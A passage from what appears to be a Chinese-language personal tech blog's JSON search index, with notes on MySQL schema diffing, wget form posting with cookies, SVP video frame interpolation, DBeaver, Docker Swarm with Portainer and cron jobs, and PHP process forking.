[MySQL 比較兩個資料庫方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/09/12/MySQL-%E6%AF%94%E8%BC%83%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E5%BA%AB%E6%96%B9%E6%B3%95/)\n但一樣沒有產生 alter table sql 語法...\n裡面的範例也沒有使用過\n今天我發現 github 裡面有一個 schemalex\n可以輕鬆產生 alter table 語法\n\n## schemalex\n\n[schemalex/schemalex: Generate difference sql of two mysql schema](https://github.com/schemalex/schemalex)\n\n```sql\n-- old.sql\nCREATE TABLE hoge (\n    id INTEGER NOT NULL AUTO_INCREMENT,\n    PRIMARY KEY (id)\n);\n```\n\n\n```sql\n-- new.sql\nCREATE TABLE hoge (\n    id INTEGER NOT NULL AUTO_INCREMENT,\n    c VARCHAR (20) NOT NULL DEFAULT \"hoge\",\n    PRIMARY KEY (id)\n);\n\nCREATE TABLE fuga (\n    id INTEGER NOT NULL AUTO_INCREMENT,\n    PRIMARY KEY (id)\n);\n```\n\nschemalex old.sql new.sql\n\n就會印出 Alter table SQL\n\n好處只要用phpmyadmin 匯出 create table 就可以完成!!\n更多用法可以參考官網文件[schemalex/schemalex: Generate difference sql of two mysql schema](https://github.com/schemalex/schemalex)\n\n## 快速產生 create sql 語法\n\n```\nSHOW CREATE TABLE tbl_name\n```\n\n相關查詢資料:\n[MySQL :: MySQL 8.0 Reference Manual :: 13.7.7.10 SHOW CREATE TABLE Statement](https://dev.mysql.com/doc/refman/8.0/en/show-create-table.html)\n[Go言語のデータベース用のライブラリを比較する - Koichi Ishida blog](https://wapa5pow.com/compare-golang-database-libraries/#k0kubunsqldef)\n[schemalex/git-schemalex: database migration tool for mysql schema is managed via git](https://github.com/schemalex/git-schemalex)\n[k0kubun/sqldef: Idempotent MySQL/PostgreSQL schema management by SQL](https://github.com/k0kubun/sqldef)\n[rubenv/sql-migrate: SQL schema migration tool for Go.](https://github.com/rubenv/sql-migrate)\n[如何快速比對資料庫結構差異並產生同步指令 - Yowko's Notes](https://blog.yowko.com/sql-server-schema-compare/)\n[SchemaCrawler - Free database schema discovery and comprehension tool](https://www.schemacrawler.com/)","tags":["sql"],"categories":["實用工具"]},{"title":"wget 做 POST 表單發送","url":"%2Fblog%2F2019%2F12%2F29%2Fwget-%E5%81%9A-POST-%E8%A1%A8%E5%96%AE%E7%99%BC%E9%80%81%2F","content":"\n最近收到一個工單\n是有關於做大量資料做修改\n目前有一隻程式做單一資料置換\n要怎麼快速對大量資料直接用現有程式做呢?\n那就多批發送表單吧\n\n<!--more-->\n\nGoogle 到 [使用curl和wget发送post请求_cws1214的专栏-CSDN博客](https://blog.csdn.net/cws1214/article/details/21440691) 可以簡單用 wget 使用\n為什麼使用 wget 做呢? 這樣就可以留下 log 紀錄檔\n相同的url 後面可以加?__idnum__\nEX:`wget --post-data=\"user=user1&pass=pass1&submit=Login\"  http://domain.com/path/page_need_login.php?12345`\n\n\n接下來目錄下會有`page_need_login.php?12345`\n這就可以當 log 資訊\n\n快速解決!!\n\n\n**2020-02-04**\n\n今天接到一個需求，使用系統要大量資料做功能處理\n但由於太多，頁面處理也需要很久的時間\n於是這件工作變成 IT 工作需求\n\n首先，這頁處理功能有確認帳號密碼\n要先排除這個，需要找 wget 可以做 cookies 傳遞\n\n[XYZ的筆記本: Linux 使用 curl (wget) 自動訪問網頁](https://xyz.cinc.biz/2014/10/linux-curl-wget-cookie.html)\n[Export Cookies – 下載 🦊 Firefox 擴充套件（zh-TW）](https://addons.mozilla.org/zh-TW/firefox/addon/export-cookies-txt/)\n\n抓取 cookies 方法\n[wget 開啟 cookie](https://www.opencli.com/linux/wget-enable-cookie-download)\n[wget取cookies 用 cookies @ echochio :: 痞客邦 ::](https://echochio.pixnet.net/blog/post/32574231-wget%E5%8F%96cookies-%E7%94%A8-cookies)\n\n使用`wget -d --load-cookies=cookies \"https://dc2.safesync.com/test.ova?dl=1\"`\n參考[[Mac] 使用 wget 送出 cookie，登入網站後下載檔案 | EPH 的程式日記](https://ephrain.net/mac-%E4%BD%BF%E7%94%A8-wget-%E9%80%81%E5%87%BA-cookie%EF%BC%8C%E7%99%BB%E5%85%A5%E7%B6%B2%E7%AB%99%E5%BE%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88/)\n可以 debug 出東西\n\n但是我想直接用瀏覽器 Cookies 出來\n一直在想 Cookies 要怎麼組\n[Export Cookies – 下載 🦊 Firefox 擴充套件（zh-TW）](https://addons.mozilla.org/zh-TW/firefox/addon/export-cookies-txt/)\n這個很快就解決問題\n\n~~其實上述網頁就有寫格式，我當初沒注意到~~\n有工具產生比較快\n\ncookies 格式\n```\ndc2.safesync.com TRUE / FALSE 0 fmprm si\n```\n\n[XYZ的筆記本: Linux 使用 curl (wget) 自動訪問網頁](https://xyz.cinc.biz/2014/10/linux-curl-wget-cookie.html)\n\n```\n\n\n取cookies\nwget --cookies=on --keep-session-cookies --save-cookies=cookie.txt \"http://server.com/\" -O 123.html\n\n用cookies\nwget --referer=\"http://server.com/\" --cookies=on --load-cookies=cookie.txt --keep-session-cookies --save-cookies=cookie.txt \"http://server.com/menu\" -O 456.html\n\n取cookies 加 user & pass\nwget --cookies=on --save-cookies=cookies.txt --post-data 'user=chio&password=chio' \"http://server.com/auth.php\"\n\n用cookies\nwget --cookies=on --load-cookies=cookies.txt -m -E -k \"http://server.com/interesting/article.php\"\n\n```\n\n[wget取cookies 用 cookies @ echochio :: 痞客邦 ::](https://echochio.pixnet.net/blog/post/32574231-wget%E5%8F%96cookies-%E7%94%A8-cookies)\n\n相信透過這些很簡單可以寫個自動化工具!!\n\n## timeout try 次數\n\n[linux - Does WGET timeout? - Stack Overflow](https://stackoverflow.com/questions/2291524/does-wget-timeout)\n\n預設 900 秒  嘗試次數 5 次","tags":["linux"],"categories":["Linux"]},{"title":"使用 SVP 補幀 4K 螢幕小記","url":"%2Fblog%2F2019%2F12%2F29%2F%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98%2F","content":"\n最近買了 ET322QK C 螢幕\n有 4K 跟 10bit 畫質\n順便也換了 Nivda GTX 2060 顯示卡\n之前舊的顯示卡是用 AMD\n有使用 AMD FM 補幀\n最近設定補幀研究設定\n在這邊做個簡單紀錄\n(不一定適合每一台電腦)\n當然我也遇到一些問題\n\n話說比較新的AMD 顯示卡不能做FM了\n買新 AMD 顯示卡需要注意!!!\n\nSVP4 PRO 2020-12-03 最近快轉速度比較不會卡頓了\n然後我發現用 MPC-HC 播放抖動其況比 PotPlayer 好\n我原本以為撥放器都一樣...\n<!--more-->\n\n## 相關教學文章\n\n* [Potplayer+Lav Filters+madVR - 知乎](https://zhuanlan.zhihu.com/p/33615747)\n* [madVR - 知乎](https://zhuanlan.zhihu.com/p/52347040)\n* [实现PC视频播放最强画质教程( Potplayer播放器+MADVR插件)](http://m.hangge.com/news/cache/detail_1461.html)\n* [madvr 720p番剧播放非专业测试 - 第2页 - 电脑讨论 - Chiphell - 分享与交流用户体验](https://www.chiphell.com/thread-1922811-2-1.html)\n* [Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊](https://www.ptt.cc/bbs/PC_Shopping/M.1554154069.A.4B6.html?fbclid=IwAR1dQUTWlp4hKBQ16QnCXP7zJiVujmTEsm2nSf7ZWCBAtHjo-Hj9T30Uhq4)\n\n[[VCB-Studio 科普教程 2.2] 基于 PotPlayer 和 madVR 的播放器教程（已更新 XySubFilter） | VCB-Studio](https://vcb-s.com/archives/7228)\n我有用這篇，推薦沒用 SVP 補真可以使用這個方式\n通常在設定 MadVR 改成 10bit 跟 NGU Anti-Alias (scale)\n\n## 補幀方法\n\n一般電影我覺得不用做補幀動作\n[(1) 【极客周刊】玩游戏为何要60帧才流畅，电影却只需24帧？ - YouTube](https://www.youtube.com/watch?v=--OKrYxOb6Y)\n我覺得這邊說的很清楚了\n\n\n### SVP 補幀\n\n前幾天 SVP Pro在半價\n又找不到便宜的二手顯示卡\n所以就決定衝了\n\n使用下也遇到很多問題\n推薦使用 MPC-HC 播放器\nSVP 跟 Potplayer 使用好像沒辦法 10 bit\n[SVP 4 User Manual - SmoothVideo Project (SVP) - frame doubling interpolation](https://www.svp-team.com/wiki/Manual:SVP)\n所以我後來使用 SVP Pro 裡面內建的 MPC-HC\n在設定上懶的在調整\n\n#### SVP、MPC 設定\n\nsvp\n裡面安裝的都裝一裝\n除了你不想用的 youtube 套件\n{% asset_img 1577603064105.gif SVP設定_1 %}\n{% asset_img Snipaste_2019-12-29_15-11-04.png SVP設定_2 %}\n{% asset_img Snipaste_2019-12-29_15-08-44.png SVP設定_3 %}\n\nmpc\n我看到很多人設定都要載入`Lav Video/Audio`\nmpc-hc不需要 load\n原因 mpc 有分成兩種\n反正 mpc-hc 有包`Lav Video/Audio`\n不需做什麼額外設定\n算滿方便的\n\n我這邊設定\n相關`Lav Video/Audio`可參考[[VCB-Studio 科普教程 2.2] 基于 PotPlayer 和 madVR 的播放器教程（已更新 XySubFilter） | VCB-Studio](https://vcb-s.com/archives/7228)\n我不確定是不是 SVP 安裝好會用好設定\n{% asset_img 1577612497847.gif _1_ %}\n{% asset_img 1577612568993.jpg _2_ %}\n這邊字幕一定要換**XySubFilter**\n\n2020-12-09\n幫我同學裝 SVP pro 發現他不能選xy-SubFilter\n假如 MPC 播放器不能選擇xy-SubFilter字幕的話，可以去上面 vcbs 連結裡面抓檔案下來安裝\n\n\n不然有時候某些片段會 Lag 掉幀\n\n\n聲音可以用獨占模式，請參考這篇設定[黑米奇SVP: 基本教程系列（四）　－　播放軟體 MPC-HC（2017-06-02更新）](https://blackmickeysvp.blogspot.com/2017/04/mpc-hc.html)\n「選項→播放器→輸出→音訊譜製器→內部音訊譜製器」\n「內部音訊譜製器→獨占模式」另外允許「位元流」可以考慮打開(我不確定那個是做什麼用)\n\n#### 缺點、改善方法\n\n##### 內嵌字幕扭曲/偽影\n\n老實說看動畫幾個非常動態畫面\n內砍字幕會被影響到\n但我也有查到改善方法[睇片研究所: SVP artifacts masking(偽影去除)設定對畫質的影響及教學](https://ppkkkp.blogspot.com/2016/07/svp-artifacts.html)\nSVP 著色器 設定`複雜`就比較沒這個問題\n大部份這個設定就能改善\n但幾個動態場景還是能感受到\n這邊用「未日時在做甚麼?有沒有空?可以來拯救嗎?」幾個片段\n\n{% asset_img 1577609946521.gif _1_ %}\n{% asset_img 1577610251475.gif _2_ %}\n\n另一個方法就是設定補插幀模式`1.5m (少量偽影)`\n但流暢度有降底，我覺得沒是有補到幀，只是沒上面的流暢\n\n{% asset_img 1577610711014.gif _1_ %}\n{% asset_img 1577610814227.gif _2_ %}\n\n不能說到完全沒有，但真的比較少\n\n至於哪個比較好，看個人喜好選擇\n\nMadVR (Ctrl+J) 看到 `dropped frames` 沒有看到明顯掉幀\n\n播放影片左下角會有 SVP 圖示\n其實可以在`應用程式設定→顯示OSD資訊`可以關閉\n但我覺得打開可以很明顯知道是不是有正常啟動SVP\n還算滿方便的\n\n還滿適合用外掛字幕來看\n\n詳細設定可參考:[黑米奇SVP: SmoothVideo Project 系列（一）　－　安裝丶簡易設定（2019-05-04更新）](https://blackmickeysvp.blogspot.com/2017/06/smoothvideo-project.html)\n### 雙顯卡\n\nAMD + Nivda 做補幀，先講一下!!\n由於我朋友是用這個方法，他一樣使用Nivda GTX 2060 和 ET322QK C 螢幕，而外買二手 2000多塊 RX 560\n可以參考這篇這定[Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊](https://www.ptt.cc/bbs/PC_Shopping/M.1554154069.A.4B6.html?fbclid=IwAR1dQUTWlp4hKBQ16QnCXP7zJiVujmTEsm2nSf7ZWCBAtHjo-Hj9T30Uhq4)\n\n使用看畫面流暢，不過 MadVR (Ctrl+J) 看到 `dropped frames` 有增加\n不過自己看畫面流暢比較重要，畢竟自己感覺比較重要\n\nFM 補幀畫面雖然沒有 SVP 比較流暢…，但相對偽影也相當少(應該是沒有)\n但相對 兩個 GPU 使用率其中一個也佔滿多的\n跟 SVP 遇到狀況也差不多\n\n**但這個有很大的缺點，你的 Power 要夠力阿!!!!**\n\n## 遇到問題\n\n### 真 4K 影片卡頓\n\n就暫時關掉 SVP 或 MadVR，我目前最大 1080P 居多\n真人電影舊不需要開補幀\n\n### 顯示卡嘯叫\n\n在電腦預設裝 MadVR 設定高畫質顯卡會發出聲音\n預設安裝不會有這種聲音\n後來裝Heaven Benchmark  跑 3D 軟體也發現有這個聲音\n只要一關掉影片(或測試顯卡軟體)聲音馬上就不見\n\n\n聲音跟這個一樣:RTX 2070 嘯叫(https://www.bilibili.com/video/av39265016/?redirectFrom=h5)\n\n\n我用 MSI Afterburner把風扇關掉 ，有肉眼確認風扇沒有再轉，聲音還是有...\n\n網路上有看到幾個方法，\n1. 更換顯示卡、主機板、電源供應器(但有些人換有失敗的，所以我不敢買)\n2. 顯卡供電口加濾波電容  (但我看到好像沒有人在賣8 pin + 濾波電容)\n顯示卡 電流聲 高頻音 coil whine 解決方法(http://joeartanis.blogspot.com/2015/12/coil-whine.html)\n有看這篇說能解決問題\n但我找不到哪裡有在賣orz\n3. 膠水大法\nhttps://www.bilibili.com/video/av8576153?from=search&seid=12894762763554126401\n裡面測試失敗\n\n聽說比較高階顯卡會遇到這個問題\n\n**目前解決方法，把NGU設定調低**\n尤其搭 SVP 的時候叫的更明顯\n不是越高就越好\n\n後來我不斷測試調設定\n發現 MSI Afterburner 看片的時候\nGPU clock 飆到 紅色三角形就會嘯叫\nGPU clock 會隨著調整 NGU 飆高\n\n{% asset_img forum1.png msi %}\n{% asset_img forum2.png list %}\n\n相關問題我有在[各位有沒有遇到顯示卡嘯叫(高頻音)情況? - 灌水聊天 - VCB-Studio分享論壇 - Powered by Discuz!](http://bbs.vcb-s.com/thread-5115-1-1.html)發問\n\n\n## 結論\n\n網路上有各式各樣設定，我覺得不用比哪個設定比較好，自己看得舒服真的比較重用\nSVP 是非常順暢，但是偽影、字幕扭曲、快轉lag(聽說有比以前好)真的是很大缺點\nFM 不是每一個影片都會做補真\n但是 FM 快轉不會頓、偽影字幕扭曲這個優勢真的很大\n雙顯示卡方法補真也是不錯選擇\n但每一個方法各有優缺點\n大家可以選擇對自己有利的方法\n自己看的舒服比較重要\n\n\n## 補幀細節參數設定\n\n**2020-12-03**\n\n推薦使用[黑米奇SVP: 測試筆記：SVP最新測試版參數beta script（2020-11-18 更新）](https://blackmickeysvp.blogspot.com/2017/07/svpbeta.html)\n裡面的`Kevingwn版`參數設定，複製到SVP4 PRO/Script 裡面去\n覆蓋前可以先備份\n`Mickey版`建議電腦比較好的人使用\n我 CPU Intel 4790k 跑得非常 lag ，~~但流暢度應該會不錯吧?!~~ 我也不確定\n不過跑的人可能要注意，他裡面會放一些外部 plugin\n移除`Mickey版`換回`Kevingwn版`有遇到奇怪的問題\n播放器會跑出 not found .......\n應該是plugin 造成的，後來一直復原檔案重開某一次就好了...\n\n這邊紀錄一下，我會拿哪些片段看偽影影片 1080P\n方便以後比偽影有沒有比較好\n以下用`Kevingwn版`有明顯改善\n\n1. Princess Principal 05 14:06~18:58\n15:15~15:23 火車鐵軌視野移動\n16:19~16:21 臉部特寫\n17:54~17:58 飛刀瞬間 這邊一定會偽影\n\n2. 紫羅蘭永恆花園 01 01:24~02:23\n01:19~01:36 寫字、掉筆\n後面紙飛出，也能觀查偽影\n\n3. 末日要做什麼? 01 \n05:22~05:35 這邊一定會偽影\n\n4. 天氣之子 01:30:12~01:36:56 (可以從重點重看XD)\n\n01:35:00~01:35:05 進入雲層偽影\n01:36:26~01:36:56 在旋轉那邊鞋子會有變形\n\n5. 鋼鍊 OP 裡面文字會抖\n\n","tags":["SVP"],"categories":["影音"]},{"title":"快速調整 INERT / UPDATE SQL 語法","url":"%2Fblog%2F2019%2F12%2F19%2F%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95%2F","content":"\n最近公司兩台 DB 資料不一致\n我可以直接使用 Dbeaver 生產 SQL\n但我發現相關欄位另外一台 DB 沒有\n移除爛為在 Editor 欄位和數值非常傷眼睛又很花時間\n\n<!--more-->\n\n後來發現 Dbeaver 能解決問題\n\n## Dbeaver 生產 SQL\n\n[SQL Generation · dbeaver/dbeaver Wiki](https://github.com/dbeaver/dbeaver/wiki/SQL-Generation)\n\n在查詢可以用以上連結方法生產\n不過，如何移除不需要的欄位呢?\n其實我發現用[Data Filters · dbeaver/dbeaver Wiki](https://github.com/dbeaver/dbeaver/wiki/Data-Filters)\n可以移除你不想要的欄位\n生產 INSERT / UPDATE 語法\nUPDATE 建議帶入 PK\n這樣產生 SQL 比較沒問題\n\n## 手動自己建立 DB\n\n首先需要自己 create table(通常會用匯出)\nINSERT INTO 資料再作刪除欄位\n匯出 SQL\n\n目前覺得第一個方法比較實用\n有想到更好的方法再回來補\n\n拿到 CSV 資料可以用 [csv 快速建立 MySQL 資料表方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/)\n[Importing a CSV into a database using DBeaver | Just Numbers & Things](https://justnumbersandthings.com/post/2018-06-12-dbeaver-import-csv/)","tags":["sql"],"categories":["SQL"]},{"title":"docker swarm 一些指令相關整理","url":"%2Fblog%2F2019%2F12%2F07%2Fdocker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86%2F","content":"\n## 基本教學網站\n\n[twtrubiks/docker-swarm-tutorial: Docker Swarm 基本教學 - 從無到有 Docker-Swarm-Beginners-Guide📝](https://github.com/twtrubiks/docker-swarm-tutorial)\n\n[Docker Swarm 管理节点高可用分析 — outmanzzq](https://outmanzzq.github.io/2019/06/18/docker-swarm-manager-ha/)\n\n由於上面網站都教的非常清楚\n我這邊只記錄如何操作跟小筆記(或我覺得重要的)\n不會詳細介紹，我覺得以上都說得很細\n\n<!--more-->\n\n### managers\n\n後續有相關指令 managers 才可以執行 (EX: docker service, docker node)\n之後下的指令是要在 manager 用\n\n### worker\n\nmanager 會分配 task 給 work 用\n\n## 基本連線\n\n要如何加入 manger 或 worker 呢?\n\n其實只要看\n`docker swarm join-token manager`\n或\n`docker swarm join-token worker`\n就能看到要加入 manager / worker 指令\n\n## docker node \n\ndocker node ls\n\n可以看到所有加入的 node\n\n\n## docker service\n\ndocker service 簡單來說就像 docker run 的 swarm 版。\n\n只能在 manager 執行，會自動分配在 node 執行\ndocker service create --name=my_nginx nginx\ndocker service create --detach=false --name my_nginx --mode replicated nginx\n\n\ndocker service update \ndocker service update --publish-add 80 my_nginx\n\n### scale\n\ndocker service scale my_nginx=5\n\n### 兩種模式\n\nreplicated:簡單說就是自動分配\nglobal   :簡單說就是全部 node 都裝\n\n預設 replicated\n\n[Docker Swarm概念与基本用法 · 零壹軒·笔记](https://note.qidong.name/2018/11/docker-swarm/)\n\n### 關掉 service\n\ndocker dervice scale my_xxx=0\n\ndocker service rm  my_xxx\n\n### docker 查看\n\ndocker service ps\n\n### 查看日誌\n\ndocker service log\n\n## docker stack\n\n簡單來說， docker stack 就是 docker compose 的 swarm 版本。\n\ndocker stack deploy --compose-file=portainer-agent-stack.yml portainer\n\n## portainer \n\n在使用 portainer 新增機器(endpoint)\n會有 agent 跟 docker\n選擇 docker ，由於 docker swarm 是叢集，所以部份建立 container 要去不同 endpint (node) 看東西\n\n使用 agent 同一台 endpoint 就能看到全部\n\n{% asset_img img1.png agent和docker %}\n\n不過哪個比較好，我還沒有確定，我們公司是用 docker\n\n設定 agent 沒有很順利，後來用完在此紀錄\n\n### agent\n\n```\n$ curl -L https://downloads.portainer.io/portainer-agent-stack.yml -o portainer-agent-stack.yml\n$ docker stack deploy --compose-file=portainer-agent-stack.yml portainer\n```\n官網設定會有很大問題，後來發現只要是 portainer 用 stack 部屬就會有問題(卡在一開始 Load 登入頁面)\n不過單獨使用 portainer container 就沒這個問題\n\n```bash\n#docker run -d -p 9000:9000 -p 8000:8000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer\n# 可使用 docker swarm 注意 我把 volume 拿掉了\ndocker service create \\\n    --name portainer \\\n    --publish 9000:9000 \\\n    --publish 8000:8000 \\\n    --replicas=1 \\\n    --constraint 'node.role == manager' \\\n#    --mount type=bind,src=//path/on/host/data,dst=/data \\    ##測試用，所以這個拿掉\n    portainer/portainer\n\ncurl -L https://downloads.portainer.io/agent-stack.yml -o agent-stack.yml && docker stack deploy --compose-file=agent-stack.yml portainer-agent\n\n```\n\n在隨便加入一個到 endpoint 就可以了\n至於官方的不知道為什麼不能用?\n目前找不到方法...(我是在 play with docker 跑的)\n也有可能跟環境問題\n\n### agent 跟 docker 差異\n\n{% asset_img img2.png agent與docker差異 %}\n\n192.168.1.17 有兩個，有一個是 agent 跟 docker\n你會發現 agent 跟別的 agent 數量是一樣的\n照道理可能加一個 agent 就可以了\n\n\n[Portainer一个轻量级的Docker环境管理UI_Kubernetes中文社区](https://www.kubernetes.org.cn/5883.html)\n[Portainer 透過 TLS 認證 - Yi Yang's Blog](https://yylin1.github.io/2019/01/28/portainer-set-tls/)\n\n## 使用 play with docker\n\n做 manager 和 worker 有預設三個 template\n我後來發現不是每一個 template 都有幫你做 swarm join\n所以建議良好習慣使用 `docker node ls` 查看有哪些加入\n\n## history\n\n預設是 5 個\n\n[linux - How to clear Docker task history - Stack Overflow](https://stackoverflow.com/questions/42364695/how-to-clear-docker-task-history)\n\ndocker swarm update --task-history-limit 5 \n\n\n## 使用 swarm volume 可能問題\n\n有時間研究再記錄\n\n[Docker集群管理Swarm数据持久化 - Bigberg - 博客园](https://www.cnblogs.com/bigberg/p/8795265.html)\n[\"三剑客”之Swarm应用数据持久化管理（volume 、bind 、 nfs）-DevOps(甘兵)-51CTO博客](https://blog.51cto.com/ganbing/2091292)\n\n\n## swarm conjob\n\n聽說 swarm 可以設定排程\n我搜尋一下完全沒有看到\n看到介紹有 schedule ，我以為內建應該會有排程東西，不過我猜這個跟 docker service 可能有關係\n不過最後還是找到 [crazy-max/swarm-cronjob: 📅 Create jobs on a time-based schedule on Docker 🐳 Swarm](https://github.com/crazy-max/swarm-cronjob)\n好像新增 label 就能設定排程\n\n不過有看到類似看到每月最後一天執行程式\n看到有人建議用 每月第一天\n之前有寫過這篇解決[排程 crontab 時間設定月底執行方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/04/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/)\n由於我公司的主機用UTC時間，但設定跟程式排程不是UTC時間\n所以必須使用這個方式完成\n\n~~有空在補這個~~\n\n**2019-12-09**\n\n今天嘗試了一夏swarm-job\n架設上非常方便\n但有幾點要特別注意\n\n### 安裝 swarm-cronjob\n\n可以用 play wtih docker 測試，開 template 3 個 manager 2 個 worker\n方法跟上面一樣\n```bash\ndocker service create \\\n    --name portainer \\\n    --publish 9000:9000 \\\n    --publish 8000:8000 \\\n    --replicas=1 \\\n    --constraint 'node.role == manager' \\\n    portainer/portainer\n\ncurl -L https://downloads.portainer.io/agent-stack.yml -o agent-stack.yml && docker stack deploy --compose-file=agent-stack.yml portainer-agent\n\n## 安裝 swarm-cronjob\ndocker service create --name swarm_cronjob \\\n  --mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock \\\n  --env \"LOG_LEVEL=info\" \\\n  --env \"LOG_JSON=false\" \\\n  --constraint \"node.role == manager\" \\\n  crazymax/swarm-cronjob\n```\n\n其他更多方式看官方文件\n\n### 執行注意\n\n```\nSet command to run the task command 需要下 command \nSet mode to replicated (default)  使用 replicated mode\nSet replicas to 0 to avoid running task as soon as the service is deployed  一開始設定replicas=0，否則會議開始就會跑\nSet restart_policy.condition to none. This is needed for a cronjob, otherwise the task will restart automatically restart_policy 請設定 none ，否則一開始會一直執行\n```\n\n```\ndocker service create --name=my_hello --replicas=0 --restart-condition=none --label  swarm.cronjob.enable=\"true\" --label swarm.cronjob.schedule=\"*/2 * * * *\" hello-world ./hello \n```\n\n\n官方可以帶的 label，前面兩個是必帶\n```\nswarm.cronjob.enable : Set to true to enable the cronjob (required)\nswarm.cronjob.schedule : CRON expression format to use. (required)\nswarm.cronjob.skip-running : Do not start a job if the service is currently running (optional)\nswarm.cronjob.replicas : Number of replicas to set on schedule in replicated mode. (optional, default 1)\n```\n\n有空再放 stack yml\n\n### agent mode global\n\n我發現我只要新增 node 加入 swarm，就會自動安裝 agent\nportainer 什麼設定都不用做!!!!太猛啦\n\n\n## 相關連結\n\n加入最愛的連結，但我沒整理，我就放一些彩蛋吧XD\n\n* [[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10196261)\n* [Docker Stack多服务编排](https://objcoding.com/2018/09/03/docker-stack/)\n* [Docker Swarm 進階實戰 (1) - Super9](https://super9.space/archives/1653)\n* [用 Docker Swarm 部署你的雲服務 (實作篇) - Soul & Shell Blog](https://blog.toright.com/posts/5598/%E7%94%A8-docker-swarm-%E9%83%A8%E7%BD%B2%E4%BD%A0%E7%9A%84%E9%9B%B2%E6%9C%8D%E5%8B%99-%E5%AF%A6%E4%BD%9C%E7%AF%87.html)\n* [docker 快速學習自我挑戰 Day7 | Vincent's Corner](https://tingsyuanwang.github.io/blogs/2017/08/01/docker-%E5%BF%AB%E9%80%9F%E5%AD%B8%E7%BF%92%E8%87%AA%E6%88%91%E6%8C%91%E6%88%B0-Day7/)\n* [[Docker 學習筆記] Run/Compose/Swarm Mode 幾個運行方式基本概念 – Tiger-Workshop Blog](https://blog.tiger-workshop.com/docker-notes-how-to-run-compose-swarm-mode/)\n* [全网最通俗易懂的Kafka入门！ - Java3y - 博客园](https://www.cnblogs.com/Java3y/p/11982381.html)\n* [Docker集群管理Swarm数据持久化 - Bigberg - 博客园](https://www.cnblogs.com/bigberg/p/8795265.html)\n* [Docker Swarm叢集實踐——部署篇 - IT閱讀](https://www.itread01.com/content/1547272631.html)\n* [Apache的三種工作模式（prefork/worker/Event）](https://www.hkposts.com/55989/apache%E7%9A%84%E4%B8%89%E7%A8%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%EF%BC%88prefork-worker-event%EF%BC%89/)\n* [Running Cron Jobs container on 5-Node Docker Swarm Mode Cluster – Collabnix](https://collabnix.com/running-cron-jobs-container-on-5-node-docker-swarm-mode-cluster/)\n* [docker叢集管理工具--Swarm以及Portainer安裝 - IT閱讀](https://www.itread01.com/content/1548180022.html)\n* [How to set the last day of the month? · Issue #234 · robfig/cron](https://github.com/robfig/cron/issues/234)\n* [Portainer一个轻量级的Docker环境管理UI_Kubernetes中文社区](https://www.kubernetes.org.cn/5883.html)\n* [使用 Haproxy + Keepalived 构建基于 Docker 的高可用负载均衡服务（一） - CODING 博客](https://blog.coding.net/blog/Haproxy&Keepalived)\n* [Haproxy+Keepalived高可用环境部署梳理（主主和主从模式）-眼眸刻着你的微笑-51CTO博客](https://blog.51cto.com/dengaosky/2129856)\n* [containers - How can I remove shutdown Docker Service tasks after a rolling update? - Stack Overflow](https://stackoverflow.com/questions/41705134/how-can-i-remove-shutdown-docker-service-tasks-after-a-rolling-update)\n* [Docker Swarm 实战 - rj-bai 's Blog](https://blog.rj-bai.com/post/150.html)\n\n## 針對 CPU 架構選擇 image\n\n1. \ndocker pull [OPTIONS] NAME[:TAG|@DIGEST]\n \n如：\ndocker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f8787\n\n2. \n// 通过如下命令指定arch:\ndocker run -it --rm <image-name>:<tag>  arch=linux/arm64\n\n方法三就不寫了，看起來很麻煩\n\n參考:[docker pull 指定 os/arch_Yu的博客-CSDN博客](https://blog.csdn.net/u010918487/article/details/107067224)\n\n","tags":["swarm"],"categories":["Docker"]},{"title":"php pcntl_fork 多程序小記","url":"%2Fblog%2F2019%2F11%2F21%2Fphp-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98%2F","content":"\n之前在 swoole 有簡單紀錄 pcntl_fork\n我在寫那篇之前，以為 pcntl_fork 執行子程序大概不會收到執行結果\n不過今天仔細看，可以接收到程式執行結果\n但還是不能傳接收參數值\n\n<!--more-->\n\n## 簡單範例\n\n[多采多姿的程式筆記: 利用PHP寫Multi Process程式 1 - 產生子程序](http://pkwbim-programming-note.blogspot.com/2008/01/phpmulti-process-1.html)\n基本上裡面範例可以直接拿來改\n建議先了解 fork 子程序概念會是最好\n\n[多采多姿的程式筆記: 利用PHP用寫Multi Process程式 - 2 使用信號機](http://pkwbim-programming-note.blogspot.com/2008/01/phpmulti-process-2.html)\nftok  swoole 裡面有 Message Quene 有提到\n\n## pcntl_wait、pcntl_waitpid \n\n[php多进程总结 - leezhxing - 博客园](https://www.cnblogs.com/leezhxing/p/5223289.html){% asset_link web2.png 備份圖 %}\n\n裡面也有提 殭屍程序\n\n[八克里: PHP Multi Process 程式以 PING 多主機應用為範例](http://blog.jangmt.com/2015/02/php-multi-process-ping.html)\n備份[mylinux_document/ping.php at master · malagege/mylinux_document](https://github.com/malagege/mylinux_document/blob/master/ping.php)\n\n## DB 連線問題\n目前有簡單實驗，父子 DB 